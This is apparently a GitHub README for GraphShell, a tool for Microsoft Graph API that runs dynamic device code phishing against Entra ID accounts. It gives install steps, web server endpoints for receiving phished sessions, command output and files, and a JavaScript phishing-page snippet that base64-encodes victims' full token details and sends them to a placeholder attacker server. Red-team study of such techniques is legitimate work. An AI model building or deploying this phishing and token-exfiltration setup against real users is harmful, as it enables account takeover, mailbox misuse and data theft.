## GraphShell: A Command-Line Tool for Microsoft Graph API Exploration
### Overview
GraphShell is a command-line not so fancy tool designed for interacting with Microsoft Graph API. Currently it facilitates many operations such as enumerating users, groups, devices, and sending emails from Entra ID ( I am lying, for some reason the mail doesn't get delivered, maybe detected as spam? ). I devloped it as I was learning and exploring Device Code Phishing and Microsoft Graph API. If you are looking for more functionality, I would recommend exploring [AADInternals](https://github.com/Gerenios/AADInternals) and [TokenTactics](https://github.com/rvrsh3ll/TokenTactics). I am sure there would be some more cool projects but I haven't explored them yet :D

### Update (05/27/2024)
It now allows interacting with multiple sessions, starting a Flask server to receive sessions (helpful during dynamic device code phishing), and performing various tasks with authenticated sessions (YESSSS! more graph api calls).
![](https://raw.githubusercontent.com/dazzyddos/GraphShell/main/images/image.png)

### Features <br>
Features
- Generate device codes for authentication.
- Interact with multiple sessions.
- Start a Flask web server to retrieve sessions remotely (Dynamic Device Code Phishing).
- List and interact with sessions.
- Execute various Microsoft Graph API commands.
- Save and load sessions to/from an SQLite database.
- Check session validity and status.
- Support for SSL for the web server.

### Web Server Endpoints
- GET /start_session: Start a new session.
- POST /start_session: Start a new session with session details.
- GET /poll_session/<session_id>: Poll for session authorization status.
- POST /receive_output: Receive command output.
- POST /receive_file: Receive a file.
- POST /heartbeat: Send a heartbeat.

#### Installation and Usage
Clone the repository:
```bash
git clone https://github.com/dazzyddos/GraphShell.git
cd GraphShell
```

Install dependencies:
```bash
pip install -r requirements.txt
```

Run the tool:
```bash
python main.py
```

Generate Device Code:
```bash
>> generate_device_code
```

Authenticate:
```
The device code needs to be entered at the provided URL i.e., https://microsoft.com/devicelogin
```

Other way to use is to start the flask server which will listen for token details:
```bash
>> start_server 1337 SSL  # can be run without SSL too
```

#### Video Demo 1 (Normal Generate Token)

<video width="640" height="480" controls>
  <source src="videos/generate_device_code.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>


### Dynamic Device Code Phishing
I don't need to explain what and how the device code phishing works. I would recommend reading this great [Blog Post](https://www.blackhillsinfosec.com/dynamic-device-code-phishing/) by [@rvrsh3ll](https://twitter.com/rvrsh3ll)
I am using the same [index.html](https://github.com/rvrsh3ll/Azure-App-Tools/blob/master/DynamicDeviceCodes/index.html) except with small modification below. By default he's only sending the device_code to his python tool but our tool requires the complete token details which needs to be sent after base64 encoding.
```javascript
function base64UrlEncode(str) {
        return btoa(str) // Standard Base64 encoder
            .replace(/\+/g, '-') // Convert '+' to '-'
            .replace(/\//g, '_') // Convert '/' to '_'
            .replace(/=+$/, ''); // Remove trailing '='
    }
    
// Convert the object to a JSON string
const jsonString = JSON.stringify(data)

// Base64 URL encode the JSON string
const base64EncodedData = base64UrlEncode(jsonString)
//console.log(base64EncodedData);

document.getElementById('code').innerHTML += data.message;

// Change this line to point to your listening webserver where the python code is running
$.get("https://<Server Name>:<port>/start_session?tok=" + base64EncodedData);
```

<video width="640" height="480" controls>
  <source src="video/dynamic_device_code.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>




